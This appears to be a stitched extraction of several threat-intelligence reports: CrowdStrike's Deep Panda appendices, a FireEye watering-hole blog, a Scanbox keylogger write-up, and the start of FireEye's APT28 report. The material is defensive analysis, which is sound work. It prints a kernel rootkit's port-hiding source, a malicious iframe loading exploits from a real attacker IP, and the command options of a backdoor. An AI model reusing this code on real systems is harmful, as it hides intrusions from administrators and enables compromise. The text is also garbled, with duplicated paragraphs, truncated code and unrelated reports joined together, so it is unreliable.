provide enhanced Operational Security ( OPSEC ) . This code appears to have been compiled on Wednes-
day May 4th , 2011 at 10:48:19 A.M. UTC ( early evening time in China ) .
Post Exploitation Tool
The post exploitation tool ( MD5 : 2dce7fc3f52a692d8a84a0c182519133 ) is a dual - use tool , it can be
dropped and executed by a client - side exploit , or the adversary can launch it using a variety of command
line options . This tool is built in Microsoft .NET framework , which is typically an indication of a less sophis-
ticated attacker , because .NET is easier to develop in but requires the .NET framework be present on the
victim machine . The tool appears to have been compiled on Thursday May 26th , 2011 at 10:21:44 A.M.
UTC ( early evening time in China ) . The sample utilizes the AES cryptographic algorithm to protect its C2
communications .
CROWDSTRIKE                                                                           S E N S I T I VE              25
DEEP PANDA
Implant # 2
Backdoor DLL
This DLL is a moderately sophisticated backdoor with several well designed communication mechanisms
not typically seen in these types of implants . The code base for the sample was developed in C++ . The
code appears to have been compiled on Sunday October 30 , 2011 at 12:43:33 P.M. UTC ( late evening time
in China ) . This sample has multiple communication capabilities available that makes it far more versatile
and stealthy . It implements relatively well thought out protocols including HTTP and DNS . The tool has the
ability to automatically down select the most effective communication channel once it has been instantiated ,
which can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement . The
DLL itself contains traces of the original C++ class names that were utilized in the source code , which in
communicating to the C2 , thus enhancing OPSEC . The sample contains ‘ dead code’ which appears to be
command and control server classes , this is likely an indicator that the C2 client which would communicate
with this sample shares the same communications library which was compiled into this sample .
System Driver
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the
CCRootkit package publicly by Steven Lai ( a / k / a embedlinux ) . This kernel mode rootkit implements several
hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL .
The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the
source code Steven Lai posted . This driver attempts to hide a wide swath of TCP ports ( 40000 - 45000 ) for
an unknown reason , however it is suspected that this may relate to the potential network relaying capability
alluded to for the backdoor dll .
System Driver
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the
CCRootkit package publicly by Steven Lai ( a / k / a embedlinux ) . This kernel mode rootkit implements several
hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL .
The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the
source code Steven Lai posted . This driver attempts to hide a wide swath of TCP ports ( 40000 - 45000 ) for
an unknown reason , however it is suspected that this may relate to the potential network relaying capability
alluded to for the backdoor dll .
CROWDSTRIKE                                                                       S E N S I T I VE          26
DEEP PANDA
APPENDIX
Appendix A : Command Line Options for Post Exploitation Tool Sample ( MD5 :
2dce7fc3f52a692d8a84a0c182519133
iu - impersonate user , iu represents a username and expects the following additional arguments .
i d -domain
ip -password
f - perform command based on value . Possible values listed below
sh - Connect to C2 .
x - hostname , connect to http address to download
y - port
u - username
w - password
l - set up listener
s - hostname
p - port
v - display communication protocol version
dl
url - url to download from .
ul
url - url to upload to .
cl
as to hide the tampering .
p - target path
m
tu
date of 11 - 30 - 2005:12:00:00 with the UTC offset of the system applied .
p - target path
m
r
d
t
wmi - perform Windows Management Instrumentation ( WMI ) command
s - machine
u - username
p - password
m - can be one of the following 3 items
CROWDSTRIKE                                                                   S E N S I T I VE             27
DEEP PANDA
Appendix B : Algorithm for computing machine ID
char ch = ‘ L’ ;
foreach(char ch2 in Environment . MachineName )
{
ch = ( char)(ch ^ ch2 ) ;
}
byte num3 = ( byte)ch ;
return ( GetVolumeSerial ( ) ^ ( uint)(((num3 + ( num3 * 0x100 ) ) + ( num3 *
0x10000 ) ) +
( num3 * 0x1000000 ) ) ) ;
Appendix C : Remote Commands Supported by .NET Backdoor Post Exploita-
tion Tool Sample
public class RcDataCommand
{
public byte channelHint ;
public RcDataCommandId cmdID ;
public RcDataCommandType cmdType ;
public string extraInfo ;
public string string_0 ;
}
Implemented values for cmdID are as follows :
CROWDSTRIKE                                                 S E N S I T I VE    28
DEEP PANDA
cmdType can be one of the following ( Interesting commands explained in detail ) :
CROWDSTRIKE                                                                       S E N S I T I VE    29
DEEP PANDA
string_0 can have one of the following values dependant upon command i d and type .
Appendix D : Raw bytes of example Authentication packet .
03 01 74 80 82 21 b5 64 c2 74 22 e3 02 00 00 00 49 03 00 00 00 00 00 00 00 00 00 00 00
00 00 00
Appendix E : Initialization of KEY and IV for AES
for ( int i = 0 ; i < 0x20 ; + + i )
{        for ( int i = 0 ; i < 0x20 ; + + i )
{
buffer[i ] = ( byte)((i + 8) + ( ( byte)password[num++ ] ) ) ;
buffer[i ] = ( byte)(buffer[i ] ^ 170 ) ;
num = num % password . Length ;
CROWDSTRIKE                                                                   S E N S I T I VE    30
DEEP PANDA
Appendix F : Command & Control Servers
C2 Server    Port    Geolocation    Whois                 Samples Used In
1.9.5.38     443     Bukit          inetnum :        1.9.0.0 - 47619fca20895abc83807321cbb80a3d
1.9.255.255
Mertajam ,      netname :
Maylasia       TMNET - AS - AP
descr :         Tmnet ,
Telekom Malaysia
Bhd .
descr :         Telekom
Malaysia Berhad
descr :         44th
Floor , Global Data
Marketing , TM Global
descr :         Jalan
Pantai Baharu
country :        MY
admin - c :        TA35-
AP
tech - c :      TA35-AP
mnt - by :        AP-
NIC - HM
mnt - lower :       TM-
NET - AP
mnt - routes : TM-
NET - AP
status :       ALLO-
CATED PORTABLE
remarks :        -+-+-+-
+ -+-+-+-+-+-+-+-++-+-
+ -+-+-+-+-+-+-+-+-+-
+ -+-+
remarks :        This
object can only be
updated by APNIC
hostmasters .
remarks :        To
update this object ,
please contact APNIC
remarks :        host-
masters and include
your organisation ’s
account
remarks :        name in
the subject line .
remarks :        -+-+-+-
+ -+-+-+-+-+-+-+-++-+-
+ -+-+-+-+-+-+-+-+-+-
+ -+-+
changed :         hm-
changed@apnic.net
20100610
source :     APNIC
CROWDSTRIKE                                                          S E N S I T I VE         31
DEEP PANDA
C2 Server       Port    Geolocation    Whois               Samples Used In
202.86.190.3    80      Hong Kong      inetnum :             2dce7fc3f52a692d8a84a0c182519133
202.86.190.0 -
202.86.191.255       de7500fc1065a081180841f32f06a537
netname :       Tele-
One - HK
country :     HK
descr :      Te-
leOne(HK ) Limited
admin - c :      HL13
tech - c :     AC612-AP
status :     AS-
SIGNED NON - POR-
TABLE
changed :       an-
gus@edu.ctm.net
20041122
mnt - by :      MAINT-
CTM - MO
source :      APNIC
Appendix G : Edward Sun ’s kernel network hook code
: [    ] NSI Module Hook : Hiding Port Under Windows Vista [                  ]
: eviloctal        : 2007 - 7 - 8 20:53          : [     ] NSI Module
Hook : Hiding Port Under Windows Vista
http://rootkit.com/newsread_print.php?newsid=735
( www.eviloctal.com )
cardmagic writes : Windows Vista has changed alot on network module , many old
port hiding materials are no longer usable .
In this post , I will share with you a simple code to hide port under Vista , hope
it is useful for some guys .
Actually under Windows Vista , netstat.exe will call InternalGetTcpTable2 which
is exported by Iphlpapi.dll to list all open ports , then InternalGetTcpTable2
will transfer control to NsiAllocateAndGetTable which is exported by nsi.dll ,
kernel mode module of NSI -- nsiproxy.sys . nsiproxy.sys is almost like a
wrapper of netio.sys , it will then call internal subroutines of netio.sys .
Here , we will use a relatively easy way -- “ NSI Kernel Module Dispatch Routine
is an old topic , this time , we will apply this method to nsiproxy.sys . Please
Check the following code(Notice : I only tested it under Windows Vista RTM
32bit ) :
CROWDSTRIKE                                                           S E N S I T I VE      32
DEEP PANDA
:
///////////////////////////////////////////////////////////////////////////////
////////
// Filename : PortHidDemo_Vista.c
//
// Author : CardMagic(Edward )
// Email : [ email]sunmy1@sina.com[/email ]
//
// Description :
//       A Demostration Of Hiding
//    Tested Under Windows Vista Kernel Version 6000 MP ( 1 procs ) Free x86 com-
patible
//
//
# include “ stdlib.h ”
# include “ ntifs.h ”
unsigned short htons(unsigned short hostshort ) ;
unsigned long inet_addr(const char * name ) ;
typedef unsigned long DWORD ;
PDRIVER_DISPATCH orgNsiDeviceIoControl = 0 ;
DWORD gLocalPort=0,gLocalIp=0 ;
typedef struct _ HP_CONTEXT
{
PIO_COMPLETION_ROUTINE oldIocomplete ;
PVOID oldCtx ;
BOOLEAN bShouldInvolve ;
PKPROCESS pcb ;
} HP_CONTEXT,*PHP_CONTEXT ;
CROWDSTRIKE                                                 S E N S I T I VE      33
DEEP PANDA
} INTERNAL_TCP_TABLE_SUBENTRY,*PINTERNAL_TCP_TABLE_SUBENTRY ;
typedef struct _ INTERNAL_TCP_TABLE_ENTRY
{
INTERNAL_TCP_TABLE_SUBENTRY localEntry ;
INTERNAL_TCP_TABLE_SUBENTRY remoteEntry ;
} INTERNAL_TCP_TABLE_ENTRY,*PINTERNAL_TCP_TABLE_ENTRY ;
typedef struct _ NSI_STATUS_ENTRY
{
} NSI_STATUS_ENTRY,*PNSI_STATUS_ENTRY ;
typedef struct _ NSI_PARAM
{
//
// Total 3CH size
//
DWORD UnknownParam1 ;
DWORD UnknownParam2 ;
DWORD UnknownParam3 ;
DWORD UnknownParam4 ;
DWORD UnknownParam5 ;
DWORD UnknownParam6 ;
PVOID lpMem ;
DWORD UnknownParam8 ;
DWORD UnknownParam9 ;
DWORD UnknownParam10 ;
PNSI_STATUS_ENTRY lpStatus ;
DWORD UnknownParam12 ;
DWORD UnknownParam13 ;
DWORD UnknownParam14 ;
DWORD TcpConnCount ;
} NSI_PARAM,*PNSI_PARAM ;
unsigned short htons(unsigned short a )
{
unsigned short b = a ;
b = ( b < < 8 ) ;
a = ( a > > 8 ) ;
return ( a | b ) ;
} ;
CROWDSTRIKE                                                   S E N S I T I VE    34
DEEP PANDA
unsigned long inet_addrt(const char * name )
{
int len = strlen(name ) ;
unsigned long temp_val[4 ] ;
char namesec[10 ] ;
{
memset(namesec,0,10 ) ;
if(&#39;.&#39 ; = = name[i ] )
{
if(p )
strncpy(namesec , name+p+1,i - p ) ;
else
strncpy(namesec , name , i ) ;
p = i ;
}
}
strncpy(namesec , name+p+1,i - p ) ;
return ( temp_val[0]|(temp_val[1]<<8)|(temp_val[2]<<16)|(temp_val[3]<<24 ) ) ;
}
NTSTATUS
HPCompletion (
IN PIRP Irp ,
IN PVOID Context
)
{
PIO_STACK_LOCATION irpsp = IoGetCurrentIrpStackLocation(Irp ) ;
PIO_STACK_LOCATION irpspNext = IoGetNextIrpStackLocation(Irp ) ;
PHP_CONTEXT pCtx = Context ;
PNSI_PARAM nsiParam ;
int i ;
if(NT_SUCCESS(Irp->IoStatus . Status ) )
{
CROWDSTRIKE                                                   S E N S I T I VE    35
DEEP PANDA
nsiParam = Irp->UserBuffer ;
if(MmIsAddressValid(nsiParam->lpMem ) )
{
//
// netstat will involve internal calls which will use
// nsiParam structure
//
if ( ( nsiParam->UnknownParam8 = = 0x38 ) )
{
KAPC_STATE apcstate ;
PNSI_STATUS_ENTRY pStatusEntry = ( PNSI_STATUS_ENTRY)nsiParam->lpStatus ;
PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = ( PINTERNAL_TCP_TABLE_ENTRY)nsi-
Param->lpMem ;
int nItemCnt = nsiParam->TcpConnCount ;
KeStackAttachProcess(pCtx->pcb,&apcstate ) ;
//
//make sure we are in the context of original process
//
for(i = 0;i < nItemCnt;i + + )
{
if((pTcpEntry[i].localEntry.dwIP = = gLocalIp)&&(pTcpEntry[i].localEn-
try . Port = = gLocalPort ) )
{
//
//NSI will map status array entry to tcp table array entry
//we must modify both synchronously
//
RtlCopyMemory(&pTcpEntry[i],&pTcpEntry[i+1],sizeof(INTERNAL_TCP_TA-
BLE_ENTRY)*(nItemCnt - i ) ) ;
RtlCopyMemory(&pStatusEntry[i],&pStatusEntry[i+1],sizeof(NSI_STA-
TUS_ENTRY)*(nItemCnt - i ) ) ;
nItemCnt-- ;
nsiParam->TcpConnCount -- ;
i-- ;
}
}
KeUnstackDetachProcess(&apcstate ) ;
}
}
}
CROWDSTRIKE                                                  S E N S I T I VE    36
DEEP PANDA
irpspNext->Context = pCtx->oldCtx ;
irpspNext->CompletionRoutine = pCtx->oldIocomplete ;
//
//free the fake context
//
ExFreePool(Context ) ;
if(pCtx->bShouldInvolve )
else
{
if ( Irp->PendingReturned ) {
IoMarkIrpPending(Irp ) ;
}
return STATUS_SUCCESS ;
}
}
NTSTATUS
IN ULONG Attributes ,
IN PACCESS_STATE AccessState OPTIONAL ,
IN ACCESS_MASK DesiredAccess OPTIONAL ,
IN KPROCESSOR_MODE AccessMode ,
IN OUT PVOID ParseContext OPTIONAL ,
) ;
{
LARGE_INTEGER waittime ;
waittime . QuadPart = -50 * 1000 * 1000 ;
-
gNsiDeviceIoControl ) ;
//
//delay loading driver to make it more secure
//
CROWDSTRIKE                                             S E N S I T I VE        37
DEEP PANDA
KeDelayExecutionThread(KernelMode,0,&waittime ) ;
return STATUS_SUCCESS ;
}
NTSTATUS HPDummyDeviceIoControl (
IN PIRP Irp
)
{
ULONG      ioControlCode ;
PIO_STACK_LOCATION irpStack ;
ULONG      status ;
irpStack = IoGetCurrentIrpStackLocation(Irp ) ;
ioControlCode = irpStack->Parameters . DeviceIoControl . IoControlCode ;
if(IOCTL_NSI_GETALLPARAM = = ioControlCode )
{
if(irpStack->Parameters . DeviceIoControl . InputBufferLength = = sizeof(NSI _
PARAM ) )
{
//
//only care the related I / O
//
PHP_CONTEXT ctx = ( HP_CONTEXT*)ExAllocatePool(NonPagedPool , sizeof(HP_CON-
TEXT ) ) ;
ctx->oldIocomplete = irpStack->CompletionRoutine ;
ctx->oldCtx = irpStack->Context ;
irpStack->CompletionRoutine = HPCompletion ;
irpStack->Context = ctx ;
ctx->pcb = IoGetCurrentProcess ( ) ;
if((irpStack->Control&SL_INVOKE_ON_SUCCESS ) = = SL_INVOKE_ON_SUCCESS )
ctx->bShouldInvolve = TRUE ;
else
ctx->bShouldInvolve = FALSE ;
irpStack->Control |= SL_INVOKE_ON_SUCCESS ;
}
}
CROWDSTRIKE                                                       S E N S I T I VE    38
DEEP PANDA
//
//call original I / O control routine
//
return status ;
}
NTSTATUS DriverEntry (
IN PUNICODE_STRING RegistryPath
)
{
int i ;
NTSTATUS status ;
UNICODE_STRING uniNsiDrvName ;
# if DBG
_ asm int 3 //debug
# endif
RtlInitUnicodeString(&uniNsiDrvName , L”\\Driver\\nsiproxy ” ) ;
-
if(!NT_SUCCESS(status ) )
{
return STATUS_SUCCESS ;
}
//
//store the original dispatch function of NSI driver
//
gLocalIp = inet_addrt(LOCALHIDEIP ) ;
gLocalPort = htons(LOCALHIDEPORT ) ;
CROWDSTRIKE                                                   S E N S I T I VE    39
DEEP PANDA
//
//hook NSI dispatch routine
//
-
myDeviceIoControl ) ;
return STATUS_SUCCESS ;
}
CROWDSTRIKE                       S E N S I T I VE    40
DEEP PANDA
Appendix H : Command and Control MD5 Correlation
MD5                                 Command and Control Server
47619fca20895abc83807321cbb80a3d    1.9.5.38:443
2dce7fc3f52a692d8a84a0c182519133    202.86.190.3:80
de7500fc1065a081180841f32f06a537    202.86.190.3:80
CROWDSTRIKE                                                  S E N S I T I VE    41

Aided Frame , Aided Direction ( Because it ’s a redirect )
Introduction :
On September 24 2014 , FireEye observed a new strategic web compromise ( SWC ) campaign that we
believe is targeting non - profit organizations and non - governmental organizations ( NGO ) by hosting
iframes on legitimate websites . The compromised websites contained an iframe to direct site visitors to a
threat actor - controlled IP address that dropped a Poison Ivy remote access tool ( RAT ) onto victims’
systems . FireEye has not yet attributed this activity though we have identified links to the Sunshop Digital
Quartermaster , a collective of malware authors that supports multiple China - based advanced persistent
threat ( APT ) groups . FireEye previously established detection measures for this threat activity , ensuring
our clients were prepared for these intrusion attempts well in advance of threat actor implementation .
Activity Overview :
On September 24 , FireEye observed SWCs , likely conducted by a unitary threat group based on shared
infrastructure and tools , on at least three different websites : an international non - profit organization that
focuses on environmental advocacy , and two different NGOs that promote democracy and human rights .
The group was able to compromise these websites and insert malicious iframes . Figure 1 displays one of
the iframes . The threat group obfuscated the iframe on two of the compromised websites .
< div class=”views - field views - field - body ” >   < div class=”field-
content”><p><iframe height=”0″
src=”http://103.27.108.45/img / js.php ” width=”0″></iframe></p >
Figure 1 : The iframe that directed website visitors to a threat actor - controlled IP address
The iframes on these websites directed visitors to Java exploits hosted at 103.27.108.45 . In turn , these
exploits downloaded and decoded a payload hosted at : hxxp://103.27.108.45/img / js.php . A GET request
to this URI returned the following content :
< applet code=”NvTest.class”,height=”200″ width=”200″ >
.<param name=”bin ” value=’4D5A90 … …’
Figure 2 : The encoded payload ( snipped for brevity )
The ‘ bin’ param shown in Figure 2 is decoded from ASCII into hex by the Java exploit . Once decoded ,
FireEye identified the payload as a Poison Ivy variant . It had the following properties :
MD5             118fa558a6b5020b078739ef7bdac3a1
Size            25608 bytes
Compile Time          2014 09 15 08:21:23
Import Hash           09d0478591d4f788cb3e5ea416c25237
The Poison Ivy variant was also code signed with the below certificate :
SHA1                47:8C : E3:D6:CC:17:60:D3:27:14:6A:36:C9:88:77:4D:27:83:6A : D4
MD5                  82B582589D4A59BE0720F088ACAC67A3
Serial Number              581AE6B6ABAFD73AC85B1AEFBDB2555F
Common Name                 zilliontek Co.,Ltd
Organization           zilliontek Co.,Ltd
Country               KR
State / Province          Gyeonggi - do
City                Suwon - si
Issue Date            Jan 12 00:00:00 2013 GMT
Expiration Date            Feb 20 23:59:59 2015 GMT
The backdoor also contained the below versioning info embedded in the RT_VERSION of one of the PE
resources :
LegalCopyright : Copyright 2012 Google Inc. All rights reserved .
InternalName : chrome_exe
ProcuctShortName : Chrome
FileVersion : 34.0.1847.131
CompanyName : Google Inc.
OrginaLFilename : chrome.exe
LegalTrademarks :
ProductName : Google Chrome
ComparyShortName : Google
LastChange : 265687
FileDescription : Google Chrome
Offcial Build : 1
PriductVersion : 34.0.1847.131
Translation : 0×0409 0x04b0
This versioning info attempted to masquerade as a Google Chrome file . However , the malware author
misspelled multiple words when attempting to put in versioning information for this particular build .
The Poison Ivy implant had the following configuration properties :
C2 : quakegoogle.servequake.com , Port : 80
Password : qeTGd3485fF
Mutex : ) ! VoqA.I4
The C2 domain quakegoogle.servequake[.]com resolved to 115.126.62.100 at the time of the SWCs . Other
domains resolving to the same IP include the following :
assign.ddnsking.com
quakegoogle.servequake.com
picsgoogle.servepics.com
Figure 3 : Domains observed resolving to 115.126.62.100
Between August 30 , 2014 and September 16 , 2014 we also observed SOGU ( aka Kaba ) callback traffic sent
to assign.ddnsking.com over port 443 .
Links to the Sunshop Digital Quartermaster
The Poison Ivy backdoor also had a RT_MANIFEST PE resource with a SHA256 fingerprint of
82a98c88d3dd57a6ebc0fe7167a86875ed52ebddc6374ad640407efec01b1393 .
This same RT_MANIFEST resource was documented in our previous Sunshop Digital Quartermaster
report . FireEye previously identified this specific RT_MANIFEST as the ‘ Sunshop Manifest,’ and we have
observed this same manifest resource used in 86 other samples . As we stated in the Quartermaster report ,
we believe this shared resource is an artifact of a builder toolkit made available to a number of China-
based APT groups .
Conclusion
This activity represents a new SWC campaign . We suspect threat actors are leveraging their access to
compromised websites belonging to NGOs and non - profits to target other organizations in the same
industries . These websites are often visited by organization employees and other organizations in the same
industries , allowing threat actors to move laterally within already compromised networks or gain access to
new networks . While FireEye has not attributed this activity to a specific threat group , we frequently
observe China - based threat actors target non - profits and NGOs , and we suspect that they seek to monitor
activity within their borders that may lead to domestic unrest or embarrass the Chinese government . For
example , in 2013 , FireEye observed China - based threat actors steal grant applications and activity reports
specifically related to an international NGO ’s China - based activities . We suspects threat actors sought to
monitor these programs and involved individuals . The three organizations whose websites are hosting the
malicious iframes have China - based operations .
FireEye is releasing information on this campaign to allow organizations to investigate and prepare for
this activity in their networks . We believe non - profits and NGOs remain at elevated risk of intrusion and
should be especially wary of attempts to compromise their networks using SWC . Threat actors may use
SWCs to achieve this goal , but FireEye does not discount the possibility that threat actors will use other
means at their disposal , including phishing . Based on past threat actor activity in this industry , FireEye
expects threat actors are motivated to steal programmatic data and monitor organizations’ programs in
specific countries . If China - based threat actors are behind the observed campaign , FireEye expects that
organizations with operations in China are high - priority targets . FireEye currently has detection measures
in place that should allow users of FireEye products to detect this SWC activity . It is also likely that other
industries or organizations were affected by this SWC activity , since these sites are public facing and
frequently visited .
Special thanks to Google ’s Billy Leonard for providing additional information and research .
Thanks to the following authors for their contributions : Mike Oppenheim , Ned Moran , and Steve Stone .
This entry was posted in Threat Intelligence , Threat Research by Sarah Engle and Ben Withnell .
Bookmark the permalink .

Scanbox : A Reconnaissance Framework Used with Watering Hole
Attacks
A few days ago we detected a watering hole campaign in a website owned by one big industrial company .
The website is related to software used for simulation and system engineering in a wide range of
industries , including automotive , aerospace , and manufacturing .
The attackers were able to compromise the website and include code that loaded a malicious Javascript
file from a remote server . This Javascript file is a framework for reconnaissance that the attackers call
" Scanbox " and includes some of the techniques we described in a previous blog post : Attackers abusing
Internet Explorer to enumerate software and detect security products
The Scanbox framework first configures the remote C&C server that it will use and collects a small amount
of information about the victim that is visiting the compromised website including :
Referer
User - Agent
Location
Cookie
Title ( To identify specific content that the victim is visiting )
Domain
Charset
Screen width and height
Operating System
Language
Resulting in something like this :
Before sending the information to the C&C server , Scanbox encodes and encrypts the data with the
following function :
Producing the following request :
If we decrypt the data it translates to :
After the first request , the framework contains several plugins to extract different information from the
victim .
Pluginid 1 : Enumerates software installed in the system using the technique we explained before that
affects Internet Explorer . It also checks if the system is running different versions of EMET ( Enhanced
Mitigation Experience Toolkit ) :
Producing the list of security software on the target
Pluginid 2 : Enumerates Adobe Flash versions
Pluginid 5 : Enumerates Microsoft Office versions
Pluginid 6 : Enumerates Acrobat Reader versions
Pluginid 8 : Enumerates Java versions
Pluginid 21 : Implements a “ keylogger ” functionality trough Javascript that logs all the keystrokes the
victim is typing inside the compromised website .
While the user is browsing the compromised website , all keystrokes are being recorded and sent to the
C&C periodically . It will also send keystrokes when the user submits web forms that can potentially
include passwords and other sensitive data .
As we have seen , this is a very powerful framework that gives attackers a lot of insight into the potential
targets that will help them launching future attacks against them .
We have also seen several Metasploit - produced exploits that target different versions of Java in the same
IP address that hosts the Scanbox framework ( 122.10.9[.]109 ) .
We recommend you look for this type of activity against the following machines in your network :
mail[.]webmailgoogle.com
js[.]webmailgoogle.com
122[.]10.9.109

SPECIAL REPORT
APT28 :
A WINDOW INTO RUSSIA ’S CYBER
ESPIONAGE OPERATIONS ?
SECURITY
REIMAGINED
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
CONTENTS
EXECUTIVE SUMMARY .................................................................................................................................................................................................................................................................................... 3
APT28 TARGETING REFLECTS RUSSIAN INTERESTS ......................................................................................................................................................................... 6
APT28 interest in the Caucasus , Particularly Georgia ............................................................................................................................................................ 7
APT28 Targeting of the Georgian Ministry of Internal Affairs ( MIA ) ........................................................................................ 8
APT28 Targeting of the Georgian Ministry of Defense ........................................................................................................................................ 9
APT28 Targeting a Journalist Covering the Caucasus ....................................................................................................................................... 10
APT28 ’s Other Targets in the Caucasus ........................................................................................................................................................................................ 11
APT28 Targeting of Eastern European Governments and Militaries .................................................................................................... 12
APT28 Targeting of NATO and Other European Security Organizations ..................................................................................... 14
APT28 Targets European Defense Exhibitions ................................................................................................................................................................ 16
Other APT28 Targets Are Consistent With Nation State Interests ......................................................................................................... 17
APT28 MALWARE INDICATES SKILLED RUSSIAN DEVELOPERS ......................................................................................................................... 19
Modular Implants Indicate a Formal Development Environment ............................................................................................................... 24
APT28 Malware Indicates Russian Speakers in a Russian Time Zone ................................................................................................. 25
Compile Times Align with Working Hours in Moscow and St. Petersburg ................................................................ 27
CONCLUSION .................................................................................................................................................................................................................................................................................................................. 28
APPENDIX A : DISTINGUISHING THREAT GROUPS .......................................................................................................................................................................... 29
APPENDIX B : TIMELINE OF APT28 LURES .......................................................................................................................................................................................................... 30
APPENDIX C : SOURFACE / CORESHELL ...................................................................................................................................................................................................................... 31
APPENDIX D : CHOPSTICK .................................................................................................................................................................................................................................................................... 35
APPENDIX E : OLDBAIT ................................................................................................................................................................................................................................................................................. 43
2 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
EXECUTIVE SUMMARY
Our clients often ask us to assess the threat Russia poses in cyberspace . Russia has
long been a whispered frontrunner among capable nations for performing
sophisticated network operations . This perception is due in part to the Russian
government ’s alleged involvement in the cyber attacks accompanying its invasion of
Georgia in 2008 , as well as the rampant speculation that Moscow was behind a
major U.S. Department of Defense network compromise , also in 2008 . These
rumored activities , combined with a dearth of hard evidence , have made Russia into
something of a phantom in cyberspace .
In this paper we discuss a threat group whose                                      the country of Georgia , Eastern European
malware is already fairly well - known in the                                        governments and militaries , and European
cybersecurity community . This group , unlike the                                    security organizations since at least 2007 .
China - based threat actors we track , does not                                       They compile malware samples with Russian
appear to conduct widespread intellectual                                          language settings during working hours
property theft for economic gain . Nor have we                                      consistent with the time zone of Russia ’s major
observed the group steal and profit from                                           cities , including Moscow and St. Petersburg .
financial account information .
While we do n’t have pictures of a building ,
The activity that we profile in this paper                                         personas to reveal , or a government agency to
appears to be the work of a skilled team of                                        name , what we do have is evidence of long-
developers and operators collecting intelligence                                   standing , focused operations that indicate a
on defense and geopolitical issues – intelligence                                  government sponsor – specifically , a
that would only be useful to a government . We                                      government based in Moscow .
believe that this is an advanced persistent
threat ( APT ) group engaged in espionage                                            We are tracking this group as APT28 .
against political and military targets including
1
Markoff , John . “ Before the Gunfire , Cyberattacks ” . The New York Times 12 August 2008 . Web . http://www.nytimes.com/2008/08/13/technology/13cyber.html
2
Knowlton , Brian . “ Military Computer Attack Confirmed ” . The New York Times . 25 August 2010 . Web . http://www.nytimes.com/2010/08/26/
technology/26cyber.html
3 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
KEY FINDINGS
APT28 targets insider information
related to governments , militaries , and
security organizations that would
likely benefit the Russian government .
GEORGIA                                          EASTERN EUROPE                            SECURITY ORGANIZATIONS
APT28 likely seeks to collect intelligence       APT28 has demonstrated interest in        APT28 appeared to target individuals
about Georgia ’s security and political           Eastern European governments and          affiliated with European security
dynamics by targeting officials working          security organizations . These victims     organizations and global multilateral
for the Ministry of Internal Affairs and         would provide the Russian government      institutions . The Russian government
the Ministry of Defense .                         with an ability to predict policymaker    has long cited European security
intentions and gauge its ability to       organizations like NATO and the OSCE
influence public opinion .                 as existential threats , particularly during
periods of increased tension in Europe .
4 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Malware compile times suggest
that APT28 developers have
consistently updated their tools
over the last seven years .
KEY FINDINGS
Since 2007 , APT28 has systematically evolved its malware ,
using flexible and lasting platforms indicative of plans for
long - term use . The coding practices evident in the group ’s
malware suggest both a high level of skill and an interest in
complicating reverse engineering efforts .
• 	    Malware compile times suggest that APT28 developers                • 	    APT28 tailors implants for specific victim
have consistently updated their tools over the last                     environments . They steal data by configuring their
seven years .                                                            implants to send data out of the network using a victim
• 	    APT28 malware , in particular the family of modular                      network ’s mail server .
backdoors that we call CHOPSTICK , indicates                        • 	    Several of APT28 ’s malware samples contain counter-
a formal code development environment . Such an                          analysis capabilities including runtime checks to
environment would almost certainly be required to                       identify an analysis environment , obfuscated strings
track and define the various modules that can be                        unpacked at runtime , and the inclusion of unused
included in the backdoor at compile time .                               machine instructions to slow analysis .
Indicators in APT28 ’s malware suggest that the group consists of
Russian speakers operating during business hours in Russia ’s major cities .
More than half of the malware samples with Portable                   Over 96% of the malware samples we have attributed to APT28
Executable ( PE ) resources that we have attributed to APT28            were compiled between Monday and Friday . More than 89%
included Russian language settings ( as opposed to neutral or          were compiled between 8AM and 6PM in the UTC+4 time zone ,
English settings ) , suggesting that a significant portion of           which parallels the working hours in Moscow and St.
APT28 malware was compiled in a Russian language build                Petersburg . These samples had compile dates ranging from
environment consistently over the course of six years ( 2007           mid-2007 to September 2014 .
to 2013 ) .
5 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
Three themes in APT28 ’s targeting clearly
reflect areas of specific interest to an
Eastern European government , most likely
the Russian government .
APT28 TARGETING REFLECTS
RUSSIAN
INTERESTS
M
any of APT28 ’s targets align generally                             whose accounts APT28 hopes to breach , the                  APT 28 : Three Themes
with interests that are typical of any                             subjects of the lures provide clues as to APT28 ’s
government . However , three themes in                               targets and interests . For example , if the group ’s
APT28 ’s targeting clearly reflects areas of specific                           lures repeatedly refer to the Caucasus , then this
interest to an Eastern European government , most                               most likely indicates that APT28 is trying to gain         The Caucasus ,
likely the Russian government . These include the                               access to the accounts of individuals whose work           particularly the
country of Georgia
Caucasus ( especially the Georgian government ) ,                                 pertains to the Caucasus . Similarly , APT28 ’s practice
Eastern European governments and militaries , and                               of registering domains that mimic those of legitimate
specific security organizations .                                               news , politics , or other websites indicates topics that
are relevant to APT28 ’s targets .
APT28 uses spearphishing emails to target its                                                                                            Eastern European
victims , a common tactic in which the threat group                             We identified three themes in APT28 ’s lures and            governments and
crafts its emails to mention specific topics ( lures )                           registered domains , which together are                     militaries
relevant to recipients . This increases the                                     particularly relevant to the Russian government .
likelihood that recipients will believe that the
email is legitimate and will be interested in                                  In addition to these themes , we have seen APT28
opening the message , opening any attached files ,                               target a range of political and military                   The North Atlantic
or clicking on a link in the body of the email . Since                          organizations . We assess that the work of these            Treaty Organization
( NATO ) and other
spearphishing lures are tailored to the recipients                             organizations serves nation state governments .
European security
organizations
7
Bloomberg . “ Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data . ” February 2014 .
8
Ibid .
9
Ibid .
6 fireeye.com
APT 28 : A Window into Russia ’s Cyber Espionage Operations ?
APT28 INTEREST IN
THE CAUCASUS ,
PARTICULARLY GEORGIA
RUSSIA
Abkhazia                                                                     Chechnya
Kavkaz Center
GEORGIA
Tbilisi
ARMENIA
TURKEY                                                                                AZERBAIJAN
Armenian Military
Yerevan
T
he Caucasus , a region that includes             Since 2011 , APT28 has used lures written in
